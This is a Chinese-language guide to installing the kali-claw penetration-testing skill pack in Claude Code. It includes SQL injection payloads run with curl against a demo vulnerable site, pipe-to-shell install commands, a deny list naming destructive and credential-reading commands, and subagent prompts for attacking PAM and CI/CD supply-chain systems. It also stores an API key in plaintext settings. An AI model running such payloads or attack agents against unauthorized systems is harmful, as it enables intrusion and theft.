# kali-claw 技能包迁移指南：在 Claude Code 上使用

> 面向 v0.1.39 | 将 kali-claw 安全技能包（111 技能域、518 工具）迁移到 Anthropic 官方 CLI 工具 Claude Code 的完整指南

---

## 一、概述

### 1.1 Claude Code 是什么

Claude Code 是 Anthropic 推出的 **官方命令行工具**，直接在终端中与 Claude 交互。它不是一个聊天机器人的封装，而是 Claude 的 **原生运行时**——Claude Code 本身就是运行环境。

**核心能力**：

- **CLI 接口** — 在终端中直接使用 Claude，支持多轮对话和上下文管理
- **CLAUDE.md 项目指令** — 项目根目录下的 Markdown 文件，定义 Claude 在该项目中的行为规则（类似系统提示词）
- **自定义智能体（Subagents）** — 放在 `~/.claude/agents/` 目录下的专业提示文件，可用 Task 工具调用
- **规则（Rules）** — 放在 `~/.claude/rules/` 下的行为准则，对所有项目或特定项目生效
- **技能（Skills，2025 新增）** — 放在 `~/.claude/skills/` 下、符合 Agent Skills 开放标准的目录式技能包
- **MCP 服务器** — 通过 Model Context Protocol 集成外部工具，让 Claude 直接调用 nmap、sqlmap 等命令
- **记忆系统** — 持久化的会话记忆，存储在 `~/.claude/projects/<project-hash>/` 目录
- **Hooks** — 在工具调用前/后自动执行的 Shell 命令（PreToolUse / PostToolUse / Stop / SessionStart 等）
- **输出风格（Output Styles）** — Explanatory / Learning / Fast（流式加速）
- **IDE 集成** — VS Code / JetBrains 自动检测并嵌入
- **Plan Mode** — Shift+Tab 切换，结构化探索 + 计划，不会实际改动文件
- **后台任务 / 并行 Agent** — `run_in_background` 和单消息多 Task 调用

**与 OpenClaw 的关键区别**：

| 特性 | OpenClaw | Claude Code |
|------|----------|-------------|
| 运行时 | 独立的 npm 框架 | Claude 原生 CLI，无需额外框架 |
| 技能系统 | Markdown 文件，由框架解析 | Markdown 文件 + Skills 目录 + 自定义智能体 |
| 工具调用 | 通过终端命令 | 通过 Bash 工具 + MCP 服务器 |
| 记忆持久化 | 文件系统（memory/ 目录） | 文件系统（~/.claude/projects/） |
| 安装依赖 | 需要 Node.js + OpenClaw | 只需要 Claude Code 本身（原生安装器无需 Node.js） |
| 上下文窗口 | 受框架限制 | Claude 原生上下文（200K+ tokens） |

### 1.2 kali-claw 技能包的价值（v0.1.39）

kali-claw 包含 **111 个安全技能域** 和 **518 个 Kali Linux 工具知识库**，是一套结构化、可量化评分的安全测试知识体系：

- **每个技能域**包含：`SKILL.md`（方法论 + YAML frontmatter）+ `payloads.md`（攻击载荷）+ `test-cases.md`（测试用例）+ `guides/`（深度指南）
- **根级配置**：`SOUL.md`（12 条黑客法则）、`IDENTITY.md`（111 行技能标签）、`TOOLS.md`（518 工具清单）
- **质量分级**：33 Distinguished（92+）/ 78 Excellent（80-91.9）/ 0 Strong / 0 Weak，**111/111 = 100% Excellent+**
- **Agent Skills 开放标准合规** — 所有 SKILL.md 使用 Anthropic 2025 年发布的 YAML frontmatter 标准
- **配套验证/编排脚本** — `validation/` 下 10+ 个 Bash 脚本（SCORE.sh、orchestrator.sh、scenario-runner.sh、heartbeat.sh 等）

**核心优势**：kali-claw 的技能本质上是 Markdown 文件，**可以直接被 Claude Code 读取和使用，无需格式转换**。Claude Code 自带的 Skill 工具原生支持 Agent Skills 标准。

### 1.3 迁移策略总览

迁移不需要"转换格式"，只需要正确地放置和引用。提供三种迁移深度：

| 迁移方式 | 耗时 | 获得能力 | 适合谁 |
|---------|------|---------|--------|
| **最小迁移** | 5 分钟 | 直接在 Claude Code 中引用技能文件 | 想快速体验的用户 |
| **标准迁移** | 30 分钟 | 自定义智能体 + 规则 + 记忆系统 + Skills 目录 | 日常使用的用户 |
| **完整迁移** | 2-3 小时 | MCP 工具集成 + Hooks 自动化 + 编排脚本接入 + 完整智能体矩阵 | 专业渗透测试工程师 / 红队 |

---

## 二、环境准备

### 2.1 安装 Claude Code（关键步骤）

Claude Code 支持三种安装方式，按推荐度排序：

#### 方式 A：原生安装器（推荐，无需 Node.js）

Anthropic 官方推荐的原生二进制安装器——比 npm 包启动更快、内存占用更低、不需要 Node.js 环境。

```bash
# macOS / Linux
curl -fsSL https://claude.ai/install.sh | bash

# 验证
claude --version

# 首次启动（交互式登录流程）
claude
```

```powershell
# Windows (PowerShell)
irm https://claude.ai/install.ps1 | iex

# 验证
claude --version
```

**原生安装器的优势**：

- 不依赖 Node.js（在 Kali minimal、Alpine、容器内尤其友好）
- 启动时间 < 1 秒（npm 版本约 2-3 秒）
- 自带更新机制：`claude update`
- 二进制体积约 50MB，比 npm 全局包小

#### 方式 B：npm 全局安装（经典方式，需 Node.js >= 18）

```bash
# 安装
npm install -g @anthropic-ai/claude-code

# 验证
claude --version
```

适用场景：已经装了 Node.js、需要保持和其他 npm 工具一致、或想用 `npm update -g` 统一升级。

#### 方式 C：IDE 自动安装（VS Code / JetBrains）

打开 VS Code 或任意 JetBrains IDE，安装 "Claude Code" 扩展，扩展会自动引导安装 CLI。安装完成后，IDE 内嵌终端可以直接 `claude` 启动，并能与编辑器联动（高亮文件、跳转定义、显示 diff）。

#### 2.1.1 认证（首次启动必做）

`claude` 首次启动会进入交互式登录流程，三种登录方式：

| 方式 | 适用 | 计费 |
|------|------|------|
| **Claude Pro/Max/Team/Enterprise 订阅** | 已订阅 claude.ai 的用户 | 包含在订阅内（有用量上限） |
| **Anthropic Console API Key** | 开发者 / 企业 | 按 token 付费（pay-as-you-go） |
| **Amazon Bedrock / Vertex AI** | 企业云客户 | 走云厂商账单 |

**用订阅登录**：在终端选择 "Login with Claude.ai"，浏览器会打开 OAuth 页面，授权后回到终端，token 自动存入 `~/.claude/credentials.json`。

**用 API Key 登录**：

```bash
# 方式 1：交互式输入（推荐，token 存到 keychain）
claude
# 选择 "Use API key"，粘贴 sk-ant-...

# 方式 2：环境变量（适合 CI/容器）
export ANTHROPIC_API_KEY="sk-ant-api03-..."
claude
```

#### 2.1.2 配置 settings.json（用户级 + 项目级）

Claude Code 的配置分三层（优先级从高到低）：

```
Enterprise policy  >  Project (.claude/settings.json)  >  User (~/.claude/settings.json)
```

**用户级配置** `~/.claude/settings.json`（首次创建）：

```json
{
  "model": "claude-opus-4-7",
  "env": {
    "ANTHROPIC_API_KEY": "sk-ant-api03-..."
  },
  "permissions": {
    "allow": [
      "Bash(nmap:*)",
      "Bash(sqlmap:*)",
      "Bash(dig:*)",
      "Bash(curl:*)",
      "Read(**)",
      "Grep(**)",
      "Glob(**)"
    ],
    "deny": [
      "Bash(rm -rf /*)",
      "Bash(sudo:*)",
      "Read(./.env)",
      "Read(./credentials*)"
    ]
  },
  "outputStyle": "default",
  "alwaysThinkingEnabled": true
}
```

**项目级配置** `<project>/.claude/settings.json`（在 kali-claw 项目里）：

```json
{
  "permissions": {
    "allow": [
      "Bash(bash validation/*)",
      "Bash(python3 validation/*)",
      "Read(skills/**)",
      "Read(memory/**)"
    ]
  }
}
```

项目级 `allow` 会叠加到用户级之上。

#### 2.1.3 常用 CLI 参数和 slash 命令

**启动参数**：

```bash
claude                          # 交互式（最常用）
claude --resume                 # 恢复上次会话（保留上下文）
claude --continue               # 继续上次会话（同上，简写 -c）
claude -p "查一下 192.168.1.1" # 单次 print 模式，输出后退出
claude --model claude-sonnet-4-6 # 临时切模型
claude --output-format json     # 输出 JSON（脚本集成用）
claude --max-turns 20           # 单会话最多 20 轮（CI 用）
```

**会话内 slash 命令**（最常用的 15 个）：

| 命令 | 作用 |
|------|------|
| `/help` | 查看所有命令 |
| `/status` | 当前模型、token 用量、登录状态 |
| `/model` | 切换模型（Opus / Sonnet / Haiku） |
| `/clear` | 清空当前会话上下文 |
| `/compact` | 智能压缩历史（保留要点） |
| `/resume` | 列出最近会话，选一个恢复 |
| `/config` | 编辑 settings.json |
| `/agents` | 列出 / 编辑自定义 subagents |
| `/rules` | 列出 / 编辑规则文件 |
| `/hooks` | 列出 / 编辑 hooks |
| `/mcp` | 列出已连接的 MCP 服务器 |
| `/permissions` | 查看 / 修改权限规则 |
| `/fast` | 切换 Fast 模式（Opus 加速输出） |
| `/init` | 在当前项目生成 CLAUDE.md 骨架 |
| `/ide` | 手动触发 IDE 集成 |

**常用快捷键**：

| 快捷键 | 作用 |
|--------|------|
| `Shift+Tab` | 切换 Plan Mode（只读探索 + 计划） |
| `Ctrl+O` | 详细模式（显示思考过程） |
| `Option+T` / `Alt+T` | 切换 Extended Thinking |
| `Esc` | 中断当前任务 |
| `@` | 输入文件路径，Claude 自动读取 |
| `!` | 前缀直接执行 shell 命令（输出回到对话） |

#### 2.1.4 常见安装/启动问题

| 问题 | 解决方案 |
|------|---------|
| 权限不足 (EACCES，npm 方式) | `sudo npm install -g @anthropic-ai/claude-code` 或换原生安装器 |
| npm 镜像超时（国内用户） | `npm config set registry https://registry.npmmirror.com` |
| Node.js 版本过低（npm 方式） | `nvm install --lts` |
| 原生安装器在容器内失败 | 容器内加 `--user $(id -u):$(id -g)` 或切 npm 方式 |
| OAuth 登录卡住 | 改用 API Key（`export ANTHROPIC_API_KEY=...`） |
| `claude --version` 报 command not found | 检查 PATH 是否包含 `~/.local/bin`（原生）或 npm global bin（npm） |
| IDE 扩展找不到 CLI | 在 IDE 终端里手动跑一次 `claude --version` 让扩展检测到 |
| 国内网络访问 Anthropic 失败 | 配置 HTTP(S)_PROXY 环境变量；或使用 Bedrock / Vertex AI 部署 |

### 2.2 准备 Kali Linux 环境

选择以下三种方案之一：

**方案 A：Kali Linux 本机（推荐）**

```bash
# 直接在 Kali 上运行 Claude Code
nmap --version  # 验证工具可用
sqlmap --version
hydra -h | head -1
```

**方案 B：远程 Kali（SSH 访问）**

```bash
# 生成 SSH 密钥
ssh-keygen -t ed25519 -C "kali-claw"

# 复制公钥到远程 Kali
ssh-copy-id user@kali-host

# 验证连接
ssh user@kali-host "nmap --version && sqlmap --version"
```

**方案 C：Docker 容器**

```bash
# 拉取并启动 Kali 容器
docker pull kalilinux/kali-rolling
docker run -it --name kali-env kalilinux/kali-rolling /bin/bash

# 在容器内安装安全工具
apt update && apt install -y nmap sqlmap nikto hydra metasploit-framework

# 退出后重新进入
docker start -ai kali-env
```

### 2.3 克隆 kali-claw 工作空间

```bash
git clone https://github.com/brucesongs/kali-claw.git
cd kali-claw
```

验证文件结构（v0.1.39 应包含 111 个技能域）：

```bash
ls -la
# 应看到：SOUL.md  AGENTS.md  IDENTITY.md  USER.md  MEMORY.md
#         TOOLS.md  HEARTBEAT.md  CHANGELOG.md  CLAUDE.md  VERSION
#         skills/  memory/  chronicle/  validation/  docs/  bak/

ls skills/ | wc -l
# 应输出 111（或接近，取决于版本）
```

### 2.4 环境检查清单

- [ ] Claude Code 已安装（`claude --version` 输出 >= 1.0.x）
- [ ] 认证完成（`claude` 启动时显示 "Logged in as ..."）
- [ ] `~/.claude/settings.json` 已配置 API Key 或 OAuth token
- [ ] Kali Linux 可用（本机 / SSH 远程 / Docker 容器）
- [ ] kali-claw 已克隆到本地，`ls skills/ | wc -l` ≈ 111
- [ ] 基本 Kali 工具可用（`nmap --version` 验证）
- [ ] 网络连接正常（能访问 api.anthropic.com）

### 2.5 首次启动验证（重要）

```bash
cd kali-claw
claude
```

进入会话后，输入以下验证对话：

```
> @CLAUDE.md 总结一下这个项目是什么

预期：Claude 读取 CLAUDE.md，给出关于 kali-claw 的简短描述
（包含 111 技能域、12 条黑客法则、Agent Skills 标准等关键词）

> 列出 skills/ 目录下的所有子目录，按字母排序

预期：Claude 调用 Bash 或 Glob，返回约 111 个技能域名称

> 读取 SOUL.md 的 12 条黑客法则

预期：Claude 读取并复述 12 条法则
```

三步全部正常，说明环境就绪。

---

## 三、方式一：最小迁移（5 分钟）

### 3.1 直接打开项目

```bash
cd kali-claw
claude
```

Claude Code 启动时会 **自动读取项目根目录的 `CLAUDE.md`** 作为项目指令。kali-claw 的 `CLAUDE.md` 已经包含项目概述和架构说明，Claude 会理解这是一个安全测试知识库。

### 3.2 开始使用

直接用自然语言对话，让 Claude 读取对应的技能文件。**用 `@` 引用文件能让 Claude 自动读取**，比写"阅读 xxx"更高效：

```
你：@skills/web-sqli/SKILL.md 帮我分析一个 SQL 注入漏洞

Claude：[自动加载 SKILL.md 内容]
      我已了解 SQL 注入技能的方法论。这个技能覆盖：
      - Union-based / Error-based / Boolean-blind / Time-blind
      - Double Query / Stacked Queries / Out-of-band
      还覆盖了 7 步攻击链：识别 → 指纹 → 检测 → 数据提取 → ...
      请提供目标信息。
```

```
你：@skills/web-sqli/payloads.md 给我一个 UNION 注入载荷

Claude：[加载 payloads.md]
      基于 payloads.md 中 UNION Injection 部分，标准载荷：

      ' UNION SELECT 1,2,3-- -

      步骤：
      1. ORDER BY 确定列数：' ORDER BY 5-- -
      2. 找回显位：' UNION SELECT 1,2,3-- -
      3. 提取数据：' UNION SELECT database(),version(),user()-- -
```

```
你：按 @skills/web-sqli/test-cases.md TC-S001 执行测试，目标是 http://testphp.vulnweb.com/listproducts.php?cat=1

Claude：[加载 test-cases.md，按 TC-S001 步骤执行]
      Step 1: 单引号触发错误
      [Bash] curl -s "http://testphp.vulnweb.com/listproducts.php?cat=1'" | head -20
      [结果] MySQL 错误信息泄露

      Step 2: 字符型注入确认
      [Bash] curl -s "http://testphp.vulnweb.com/listproducts.php?cat=1' AND '1'='1"
      [Bash] curl -s "http://testphp.vulnweb.com/listproducts.php?cat=1' AND '1'='2"
      [对比] AND '1'='1 正常返回，AND '1'='2 返回空

      ✓ 确认 SQL 注入（字符型，单引号闭合）
      建议下一步：用 sqlmap 自动化提取
```

### 3.3 最小迁移的局限

- **每次都要手动 `@` 引用技能文件路径**
- **没有持久记忆** — 关闭会话后，Claude 不记得之前的分析结果
- **没有自动化智能体** — 无法用 Task 工具调用专业 subagent
- **没有工具集成** — 不能直接调用 sqlmap、nmap 等（除非每次都让 Claude 用 Bash）
- **没有 Skills 目录** — Claude 不会在每次扫描时自动加载 frontmatter

适合：快速体验、临时测试、一次性任务。

---

## 四、方式二：标准迁移（30 分钟）

### 4.1 配置 CLAUDE.md（项目指令）

在 kali-claw 项目的 `CLAUDE.md` 末尾追加安全智能体的行为指令：

```markdown
## Security Agent Mode

When the user requests security testing, vulnerability analysis, or penetration testing tasks, activate Security Agent Mode:

### Role
You are kali-claw, a senior penetration testing engineer. You operate under the 12 Hacker Laws defined in SOUL.md.

### Behavioral Guidelines
- Read SOUL.md for the 12 Hacker Laws before any security operation
- Always verify authorization scope before testing
- Follow the methodology defined in the relevant SKILL.md
- Use payloads from payloads.md, not improvisation
- Document findings per test-cases.md format
- Never execute destructive commands without explicit user confirmation

### Skill Index (v0.1.39 — 111 domains)

**Web & API**: web-sqli, web-xss, web-ssrf, web-auth-bypass, web-access-control, web-xxe, web-deserialization, file-inclusion, cms-framework-attack, api-security, email-security-deep, browser-qa

**Network & Infra**: network-pentest, recon-osint, osint, network-sniffing-mitm, network-tunneling-proxy, dns-attacks, vpn-attack, sase-sse-attack, email-protocol-attack, voip-sip-attack

**Identity & Enterprise**: ad-ldap-attack, ad-cs-abuse, cloud-identity-attack, pam-privilege-attack, ci-cd-supply-chain-attack, cspm-casb-attack

**Cloud & Container**: cloud-security, container-security, kubernetes-attack, cloud-native-vuln-research, secret-management-attack

**Crypto & Emerging**: crypto-attacks, quantum-crypto-attack, blockchain-web3, llm-red-team, ai-security, ai-agent-security, agentic-pentest

**Mobile / IoT / Embedded**: mobile-security, mobile-app-instrumentation, iot-pentest, firmware-reverse, hardware-security, embedded-rtos-security, bluetooth-rfid-nfc

**Critical Infrastructure**: scada-ics-security, ics-fieldbus-attack, storage-san-attack, hypervisor-introspection, satellite-leo-security, sdr-rf-attack, hf-vhf-radio-attack, 5g-telecom-attack, automotive-vehicle-security, uav-drone-security, physical-security-testing, mainframe-security, game-anticheat-bypass

**Defense & Forensics**: digital-forensics, anti-forensics, threat-hunting, detection-engineering, deception-honeypot

**Meta & Orchestration**: pentest-reporting, article-writing, engagement-manager, security-review, repo-scan, security-bounty-hunter, codebase-onboarding, knowledge-ops, exa-search, deep-research, data-scraper-agent, autonomous-loops, multi-agent-collaboration, council

**Infrastructure Skills**: safety-guard, terminal-ops, search-first, verification-loop, docker-patterns, continuous-learning, chronicle, tool-mastery, mcp-server-patterns, password-attack, post-exploitation, privilege-escalation, exploit-development, payload-generation, av-edr-evasion, steganography, social-engineering, social-intelligence, username-profiling, darkweb-intel, binary-reverse, insecure-design, logging-monitoring, mobile-security, security-misconfiguration, supply-chain-security, vulnerability-assessment, wifi-pentest

When a security task is requested, automatically identify the relevant skill domain and read its SKILL.md first.

### Safety Boundaries
- Only test targets within explicitly authorized scope
- Use safety-guard principles from skills/safety-guard/SKILL.md
- Log all actions to memory/YYYY-MM-DD.md
- Never store credentials or tokens in memory files
```

> 注意：是 **追加到 CLAUDE.md**，不要修改 `skills/` 下任何文件。

### 4.2 创建 Skills 目录（推荐方式，符合 Agent Skills 标准）

Claude Code 2025 年起原生支持 Skills 目录，**这是引用 kali-claw 技能最干净的方式**——不需要把每个技能转成 agent 文件。

**两种思路对比**：

| 方式 | 实现 | 优点 | 缺点 |
|------|------|------|------|
| **Skills 目录（推荐）** | `~/.claude/skills/<name>/SKILL.md` 软链到 kali-claw 的 SKILL.md | Claude 自动扫描 frontmatter；无需 subagent 调度 | 单技能独立工作，无编排 |
| **Subagent 方式** | 在 `~/.claude/agents/<name>.md` 里写引用 | 可定义工具权限和操作流程 | 数量多了维护成本高 |

**实战建议**：高频技能（10-20 个）建 Subagent，其他建 Skill 软链。

**操作 1：批量软链 Skills（一次性把 111 个技能挂到 Claude 全局）**

```bash
mkdir -p ~/.claude/skills
cd /path/to/kali-claw/skills

# 把每个技能域软链到 ~/.claude/skills/
for d in */; do
  name="${d%/}"
  ln -sf "$(pwd)/$name" "$HOME/.claude/skills/$name"
done

# 验证
ls -l ~/.claude/skills/ | head -10
# 应看到一堆 -> /path/to/kali-claw/skills/xxx 的软链
```

软链的好处：kali-claw `git pull` 更新后，Claude 立即看到新内容，无需重新复制。

**操作 2：让 Claude 识别这些 Skills**

重启 Claude Code 后，会话内执行：

```
> /skills
```

应能看到约 111 个 Skills 列表。也可以直接调用：

```
> 使用 web-sqli 技能帮我测试 http://testphp.vulnweb.com/listproducts.php?cat=1

Claude：[扫描到 ~/.claude/skills/web-sqli/SKILL.md，加载 frontmatter]
       [读取完整 SKILL.md，按方法论执行]
```

### 4.3 创建自定义 Subagent（针对高频技能）

把 5-10 个最常用的技能转成 Subagent，赋予它们调用工具的权限和清晰的操作流程。

**创建 subagents 目录**：

```bash
mkdir -p ~/.claude/agents
```

**示例：web-sqli 分析 subagent**（`~/.claude/agents/web-sqli-analyzer.md`）：

```markdown
---
name: web-sqli-analyzer
description: SQL injection vulnerability analysis and exploitation specialist. Covers Union/Blind/Time-based/Error-based/Double Query injection detection, exploitation, and defense recommendations. Use PROACTIVELY for any SQL injection task.
tools:
  - Bash
  - Read
  - Write
  - Grep
  - Glob
  - Skill
  - Task
---

You are a SQL injection security specialist embedded in the kali-claw penetration testing system.

## Knowledge Base

Always read these files for reference when handling SQL injection tasks:
- `skills/web-sqli/SKILL.md` — Complete methodology, tools, and attack chain
- `skills/web-sqli/payloads.md` — Payload collection organized by 10 injection types
- `skills/web-sqli/test-cases.md` — Structured test case templates (TC-S001 to TC-S012)
- `skills/web-sqli/guides/` — Deep-dive guides for advanced techniques

## Operating Procedure

1. **Read SKILL.md first** — Always load the methodology before starting any task
2. **Identify injection type** — Determine if the target shows echo, error, or blind behavior
3. **Follow the attack chain** — Detection -> Fingerprinting -> Exploitation -> Data Extraction
4. **Use structured payloads** — Pull from payloads.md, do not improvise payloads
5. **Document per test-cases.md** — Record findings using TC-SXXX format
6. **Provide defense recommendations** — Always include remediation advice

## Safety Rules

- Only test targets within explicitly authorized scope
- Confirm with the user before any destructive SQL operations (DROP, DELETE, UPDATE)
- Never exfiltrate real user data — use dummy data for proof-of-concept
- Log all findings to memory/YYYY-MM-DD.md

## Response Format

For each finding, include:
- Injection type and location
- Payload used
- Data accessible through this vulnerability
- CVSS severity estimate
- Remediation recommendation

## Tools Priority

1. **sqlmap** for automated detection and exploitation
2. **curl** for manual injection testing
3. **Burp Suite** guidance for complex scenarios (describe steps, user operates Burp)
```

**针对现代企业攻击面的 subagent 示例**（v0.1.39 新技能）：

```bash
# PAM 攻击 subagent
cat > ~/.claude/agents/pam-attacker.md << 'AGENT_EOF'
---
name: pam-attacker
description: PAM (Privileged Access Management) platform attack specialist. Covers CyberArk PVWA/PSM, BeyondTrust PRA, Delinea Secret Server, One Identity Safeguard, ManageEngine PMP, WALLIX Bastion, Devolutions DVLS, Xton Core. CVE-2025-32564, CVE-2022-2451, CVE-2022-28226, .cue cred file cracking.
tools:
  - Bash
  - Read
  - Grep
  - Glob
  - Skill
---

You are a PAM platform attack specialist. Read skills/pam-privilege-attack/SKILL.md for the 8-vendor methodology. Use payloads from skills/pam-privilege-attack/payloads.md. Map findings to MITRE ATT&CK T1552 (Unsecured Credentials). Always document per test-cases.md.
AGENT_EOF

# CI/CD 供应链 subagent
cat > ~/.claude/supply-chain-attacker.md << 'AGENT_EOF'
---
name: supply-chain-attacker
description: CI/CD and software supply chain attack specialist. Jenkins CVE-2024-23897, GitLab CI Runner, GitHub Actions pull_request_target trap, Argo CD CVE-2022-24348, xz-utils CVE-2024-3094 backdoor analysis, dependency confusion, SolarWinds SUNBURST, 3CX, Codecov.
tools:
  - Bash
  - Read
  - Grep
  - Glob
---

You are a CI/CD and software supply chain attack specialist. Read skills/ci-cd-supply-chain-attack/SKILL.md for methodology. Reference payloads from skills/ci-cd-supply-chain-attack/payloads.md. Map findings to MITRE T1195 (Supply Chain Compromise).
AGENT_EOF
```

### 4.4 创建安全规则文件

将 kali-claw 的安全准则转换为 Claude Code 规则：

```bash
mkdir -p ~/.claude/rules
```

创建 `~/.claude/rules/kali-claw-security.md`：

```markdown
# kali-claw Security Rules

## Mandatory Safety Checks

Before ANY security testing command:
- [ ] Target is within explicitly authorized scope
- [ ] User has confirmed the target and test type
- [ ] Safety-guard skill principles have been reviewed
- [ ] No destructive commands without triple confirmation

## The 12 Hacker Laws (from SOUL.md)

1. **First Principles Thinking** — Break problems down to fundamental facts
2. **Divergent Thinking First** — Consider at least 3 solutions before acting
3. **Minimize Attack Surface** — Less exposure means less risk
4. **Defense in Depth** — Never rely on a single layer
5. **Least Privilege** — Grant only necessary access
6. **Assume Breach** — Design assuming attacker is already inside
7. **Obscurity Is Not Security** — Security from design, not hiding
8. **Trust but Verify** — Verify all inputs and outputs
9. **Information Wants to Be Free** — Share knowledge, protect sensitive data
10. **Skill Over Credentials** — Judge by capability
11. **The Weakest Link Is Human** — Always consider human factor
12. **Murphy's Security Law** — If it can be exploited, it will be

## Command Execution Rules

- Never use `rm` — use trash or move to bak/ directory
- Triple confirmation required for destructive operations
- Always log actions to memory/YYYY-MM-DD.md
- Never write sensitive data (API keys, tokens, passwords) to memory files
- Proactively redact sensitive information in responses

## File Operations

- Back up core files to bak/ directory before modification
- Never overwrite SOUL.md, USER.md, IDENTITY.md without user awareness
- Memory files are append-only — do not delete past entries
```

### 4.5 配置记忆系统

将 kali-claw 的记忆映射到 Claude Code 的记忆系统。

**两套记忆系统的对应关系**：

| kali-claw 记忆 | Claude Code 记忆 | 说明 |
|---------------|-----------------|------|
| `memory/YYYY-MM-DD.md` | `~/.claude/projects/<hash>/memory/` | 每日会话记录 |
| `MEMORY.md`（根目录） | 项目记忆文件 | 长期精炼知识 |
| `chronicle/YYYY-MM/*.md` | 手动维护 | 月度里程碑 |

**配置项目记忆**：

```bash
# 确定项目记忆路径（Claude Code 用项目路径的 MD5 哈希作为目录名）
ls ~/.claude/projects/

# Linux
PROJECT_MEMORY=~/.claude/projects/$(echo -n "/path/to/kali-claw" | md5sum | cut -d' ' -f1)/memory

# macOS（用 md5 而非 md5sum）
PROJECT_MEMORY=~/.claude/projects/$(echo -n "/path/to/kali-claw" | md5)/memory

mkdir -p "$PROJECT_MEMORY"

# 复制长期记忆
cp MEMORY.md "$PROJECT_MEMORY/long-term-knowledge.md"

# 复制近期每日记忆（可选）
cp memory/2026-06-*.md "$PROJECT_MEMORY/"
```

**记忆系统的使用**：

```
你：把这个 SQL 注入漏洞的发现记录到记忆中

Claude：[将发现追加写入 ~/.claude/projects/.../memory/2026-06-28.md]
      已记录。下次会话时我仍会记得这个发现。
```

### 4.6 标准迁移后的目录结构

```
kali-claw/                           <-- 项目根目录（git 跟踪）
├── CLAUDE.md                        <-- 追加 Security Agent Mode（修改）
├── SOUL.md / IDENTITY.md / ...      <-- 全部保持原样
├── .claude/
│   └── settings.json                <-- 项目级权限配置（新增）
├── skills/                          <-- 111 个技能域（不变）
├── validation/                      <-- 评分 + 编排脚本（不变）
├── memory/ / chronicle/             <-- 记忆文件（不变）
└── ...

~/.claude/                           <-- 用户级配置
├── settings.json                    <-- API Key、模型、权限（首次创建）
├── agents/                          <-- Subagents（新增 5-10 个高频技能）
│   ├── web-sqli-analyzer.md
│   ├── pam-attacker.md
│   └── supply-chain-attacker.md
├── skills/                          <-- Skills 软链（一次性 111 个）
│   ├── web-sqli -> /path/kali-claw/skills/web-sqli
│   ├── pam-privilege-attack -> ...
│   └── ... (111 个软链)
├── rules/
│   └── kali-claw-security.md        <-- 安全规则
├── projects/
│   └── <hash>/
│       └── memory/                  <-- Claude Code 项目记忆
└── credentials.json                 <-- OAuth token（自动生成）
```

---

## 五、方式三：完整迁移（2-3 小时）

### 5.1 MCP 服务器集成（让 Claude 直接调用 Kali 工具）

通过 MCP 服务器，让 Claude Code **直接调用** Kali 安全工具，而不需要手动 Bash 命令。

**安装 MCP SDK**：

```bash
pip install mcp
# 或 uv（更快）
uv pip install mcp
```

**完整的 nmap MCP 服务器**（`~/kali-mcp-servers/nmap_server.py`）：

```python
#!/usr/bin/env python3
"""nmap MCP Server — Wraps nmap as an MCP tool for Claude Code."""

import subprocess
import json
import sys
from mcp.server import Server
from mcp.types import Tool, TextContent

server = Server("kali-nmap")

@server.list_tools()
async def list_tools():
    return [
        Tool(
            name="nmap_scan",
            description="Run nmap network scan. Supports common scan types.",
            inputSchema={
                "type": "object",
                "properties": {
                    "target": {
                        "type": "string",
                        "description": "Target IP, hostname, or CIDR (e.g., 192.168.1.1 or 192.168.1.0/24)"
                    },
                    "ports": {
                        "type": "string",
                        "description": "Port range (default: 1-1000)",
                        "default": "1-1000"
                    },
                    "scan_type": {
                        "type": "string",
                        "description": "-sV (version), -sC (scripts), -O (OS), -A (aggressive)",
                        "default": "-sV"
                    },
                    "extra_args": {
                        "type": "string",
                        "description": "Additional nmap arguments",
                        "default": ""
                    }
                },
                "required": ["target"]
            }
        ),
        Tool(
            name="nmap_vuln_scan",
            description="Run nmap vulnerability scan using NSE vuln scripts.",
            inputSchema={
                "type": "object",
                "properties": {
                    "target": {"type": "string", "description": "Target"}
                },
                "required": ["target"]
            }
        )
    ]

def validate_target(target: str) -> bool:
    if not target or len(target) > 256:
        return False
    blocked = set(";|&`$(){}[]<>!#~")
    return not any(c in blocked for c in target)

def run_nmap(args: list[str], timeout: int = 300) -> str:
    try:
        result = subprocess.run(
            ["nmap"] + args,
            capture_output=True, text=True, timeout=timeout
        )
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "Error: nmap scan timed out after 300 seconds"
    except FileNotFoundError:
        return "Error: nmap not found. Install: sudo apt install nmap"

@server.call_tool()
async def call_tool(name: str, arguments: dict):
    if name == "nmap_scan":
        target = arguments["target"]
        if not validate_target(target):
            return [TextContent(type="text", text="Error: Invalid target")]
        ports = arguments.get("ports", "1-1000")
        scan_type = arguments.get("scan_type", "-sV")
        extra = arguments.get("extra_args", "")
        args = scan_type.split() + ["-p", ports]
        if extra:
            args += extra.split()
        args.append(target)
        return [TextContent(type="text", text=run_nmap(args))]

    elif name == "nmap_vuln_scan":
        target = arguments["target"]
        if not validate_target(target):
            return [TextContent(type="text", text="Error: Invalid target")]
        return [TextContent(type="text", text=run_nmap(["--script", "vuln", target], timeout=600))]

    return [TextContent(type="text", text=f"Unknown tool: {name}")]

if __name__ == "__main__":
    import asyncio
    asyncio.run(server.run())
```

**配置 MCP 服务器**（项目根目录 `.mcp.json`）：

```json
{
  "mcpServers": {
    "kali-nmap": {
      "command": "python3",
      "args": ["/Users/YOUR_USERNAME/kali-mcp-servers/nmap_server.py"]
    },
    "kali-sqlmap": {
      "command": "python3",
      "args": ["/Users/YOUR_USERNAME/kali-mcp-servers/sqlmap_server.py"]
    }
  }
}
```

sqlmap MCP 服务器结构类似，限于篇幅不再贴完整代码，参考 nmap 模板实现 `sqlmap_detect` 和 `sqlmap_dbs` 两个工具即可。

**远程 Kali 的 MCP 配置**（通过 SSH 调用远程 Kali 工具）：

```json
{
  "mcpServers": {
    "kali-nmap-remote": {
      "command": "python3",
      "args": ["~/kali-mcp-servers/remote_nmap_server.py"],
      "env": {
        "KALI_HOST": "user@192.168.1.100",
        "KALI_SSH_KEY": "~/.ssh/id_ed25519"
      }
    }
  }
}
```

远程 MCP 服务器在执行 nmap 时通过 SSH 调用：

```python
# remote_nmap_server.py 关键修改
import os
KALI_HOST = os.environ.get("KALI_HOST", "user@kali-host")
SSH_KEY = os.environ.get("KALI_SSH_KEY", "~/.ssh/id_ed25519")

def run_nmap_remote(args: list[str], timeout: int = 300) -> str:
    ssh_cmd = ["ssh", "-i", SSH_KEY, KALI_HOST, "nmap"] + args
    result = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=timeout)
    return result.stdout + result.stderr
```

### 5.2 Hooks 自动化（实现 HEARTBEAT 部分）

**范围检查 Hook**（PreToolUse）— 在执行 Bash 命令前自动检查目标是否在授权范围内。

创建 `~/kali-hooks/check-scope.sh`：

```bash
#!/bin/bash
